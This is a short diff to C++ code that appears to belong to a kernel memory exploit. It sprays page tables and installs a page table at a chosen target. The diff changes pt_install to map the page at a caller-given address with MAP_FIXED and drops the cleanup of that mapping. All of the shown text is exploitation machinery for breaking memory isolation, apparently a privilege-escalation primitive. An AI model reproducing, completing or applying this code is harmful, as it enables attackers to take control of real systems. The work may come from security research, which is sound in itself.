@@ -9,7 +9,8 @@ int pt_spray_bait_allocator(void* ctx) {
     return pt_spray_tables(*static_cast<pt_spray_args_t*>(ctx));
 }
 
-pt_install_ctxt pt_install(void* page_block, void* pt_target) {
+pt_install_ctxt
+pt_install(void* page_block, void* pt_target, void* addr) {
     auto pt_ctxt = pt_install_ctxt{};
 
     const char* buf = "ffffffffffffffff";
@@ -34,11 +35,11 @@ pt_install_ctxt pt_install(void* page_block, void* pt_target) {
     munlock(pt_target, PAGE_SIZE);
     block_merge(pt_target, 0);
     // Install the page table at the target.
-    pt_ctxt.pt_mapped = mmap(spray_args.start + PAGEBLOCK_SIZE, PAGE_SIZE,
-                             PROT_READ | PROT_WRITE,
-                             MAP_FIXED | MAP_SHARED | MAP_POPULATE,
-                             pt_ctxt.fd,
-                             0);
+    mmap(addr, PAGE_SIZE,
+         PROT_READ | PROT_WRITE,
+         MAP_FIXED | MAP_SHARED | MAP_POPULATE,
+         pt_ctxt.fd,
+         0);
 
     return pt_ctxt;
 }
@@ -47,5 +48,4 @@ void pt_deallocate(const pt_install_ctxt& pt_ctxt) {
     close(pt_ctxt.fd);
     munlock(pt_ctxt.fd_ptr, PAGE_SIZE);
     munmap(pt_ctxt.fd_ptr, PAGE_SIZE);
-    munmap(pt_ctxt.pt_mapped, PAGE_SIZE);
 }
